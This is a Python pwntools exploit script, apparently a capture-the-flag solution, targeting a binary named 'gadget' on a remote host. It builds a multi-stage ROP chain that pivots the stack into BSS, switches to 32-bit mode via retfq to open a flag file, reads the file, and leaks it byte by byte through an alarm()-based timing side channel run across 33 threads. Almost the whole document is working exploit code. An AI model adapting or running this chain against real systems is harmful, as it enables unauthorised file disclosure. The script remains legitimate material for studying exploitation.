
from pwn import * 

context.log_level='debug'
context.terminal = ['tmux', 'splitw']

cmd = '''
b * 0x0000000000401222
b * 0x0000000000408865
b * 0x00000000004011f3
'''

# pop rdi; jmp rax; 
poprdi_jmprax = 0x0000000000402be4
#  pop rdi; pop rbp; ret;
poprdi_poprbp = 0x0000000000401734

# : pop rsi; pop r15; jmp rax;
poprsi_1_jmprax = 0x0000000000402be2
# : pop rsi; pop r15; pop rbp; ret;
poprsi_2 = 0x0000000000401732

# : mov rdx, r12; call r14;
movrdx_callr14 = 0x0000000000402c07
# : pop r12; pop r14; pop r15; pop rbp; ret;
popr12_popr14_2 = 0x000000000040172f

# : pop rax; ret;
poprax = 0x0000000000401001
# : pop rbp; ret;
poprbp_ret = 0x0000000000401102
# : syscall; ret;
syscall_ret = 0x0000000000408865
# : leave; mov qword ptr [rdi + rdx - 0x2f], rax; mov qword ptr [rdi + rdx - 0x27], rax; mov rax, rdi; ret; 
leave = 0x0000000000403be5
# : leave; mov dword ptr [rbp - 0x40], eax; mov eax, ecx; add rsp, 0x40; pop rbp; ret; 
leave2 = 0x0000000000401224
# : ret; 
ret = 0x0000000000401002

# : int 0x80; ret; 
int80 = 0x00000000004011f3
# .text:retfq
retfq = 0x00000000004011EC

# 0x0000000000402cf5: pop rbx; pop r14; pop r15; pop rbp; ret; 
poprbx_popr14_2 = 0x0000000000403072

# 0x000000000040115b: pop rcx; ret;
poprcx = 0x000000000040117b

#  mov bl, [rsi+rax];mov rdi, rbx;push r14;retn; 
movrdi = 0x00000000004011BE

# : pop r14; pop r15; pop rbp; ret;
popr14_2 = 0x0000000000401731
# 000000000040119A: jmp $
loop = 0x00000000004011BA

bss = 0x00000000040D160
ptr = bss 
fake_rbp = bss
buf = fake_rbp + 0x8

alarm = 0x000000000401150

def exp(idx):
    #cn = process('./gadget')
    cn = remote("81.69.0.47",  2102)

    payload = flat(b'a' * 0x30, 0, 
            # read(0, buf, 0x200)
            poprdi_jmprax, 0, 
            poprsi_1_jmprax, ptr, 0, 
            popr12_popr14_2, 0x300, poprbp_ret, 0, 0, 
            movrdx_callr14, 
            poprax, 0, 
            syscall_ret, 
            # leave stack->fake_rbp(in bss)
            # poprdi_poprbp, ptr, fake_rbp, 
            poprbp_ret, fake_rbp, 
            leave2, 
        arch='amd64')

    stack = flat(ptr, arch='amd64')
    flag_str =  b'./test\x00'.ljust(0x40, b'\x00') 
    to32 = flat(0, 
            retfq, ret, 0x23, 
        arch='amd64') 

    rop32 =  flat(
            # open(flag, 0, 0)
            # eax=5, ebx=flag, ecx=0, edx=0, 
            poprax, 5, 
            poprbx_popr14_2, buf, 1, 2, 3, 
            poprcx, 0, 
            int80, 
            retfq, ret, 0x33, 
        arch='i386') 

    rop64 = flat(
            # read(3, flag, 0x40)
            poprdi_poprbp, 3, 0, 
            poprsi_2, buf, 0, 0, 
            popr12_popr14_2, 0x40, poprbp_ret, 0, 0, 
            movrdx_callr14, 
            poprax, 0, 
            syscall_ret, 

            # alarm([flag+idx])

            # rax = idx
            poprax, idx, 
            # rsi = flag 
            # r14 = alarm
            # rbx = 0
            poprbx_popr14_2, 0, alarm, 0, 0, 
            # [flag+idx]
            movrdi, 
            loop, 
        arch='amd64')

    rop = stack + flag_str  + to32 + rop32 + rop64

    # gdb.attach(cn, cmd)
    cn.send(payload)
    start = time.time()
    cn.sendline(rop)
    # cn.interactive()
    try:
        cn.recv()
    except:
        ...
    end = time.time()
    cn.close()
    pass_time = int(end-start)
    print(hex(pass_time))
    flag[idx] = pass_time
    print(bytes(flag))

pool = []
flag = [0]*33
for i in range(33):
    t = threading.Thread(target=exp, args=(i, ))
    pool.append(t)
    t.start()
for i in pool:
    t.join()
print(bytes(flag))
# exp(0)

